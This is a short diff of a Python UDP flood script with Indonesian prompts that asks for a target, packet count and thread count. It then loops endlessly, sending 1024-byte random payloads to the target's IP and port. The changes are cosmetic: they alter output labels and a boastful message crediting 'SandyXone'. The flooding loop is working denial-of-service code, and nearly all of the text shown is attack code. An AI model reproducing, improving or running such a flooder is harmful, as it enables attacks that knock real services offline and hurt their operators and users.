@@ -16,14 +16,14 @@ times = int(input(" Paket yang dikirim ke target:"))
 threads = int(input(" Threads yang dikirim:"))
 def run():
 	data = random._urandom(1024)
-	i = random.choice(("[XD]","[XD]","[XD]"))
+	i = random.choice(("[1]","[2]","[3]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" Tok..Tok..Tok..Ada Paket Dari SandyXone Nih!!!")
+			print(i +" Tok..Tok..Tok..Ada Paket Dari SandyXone Nih")
 		except:
 			print("[!] TOLOL!!!")
 
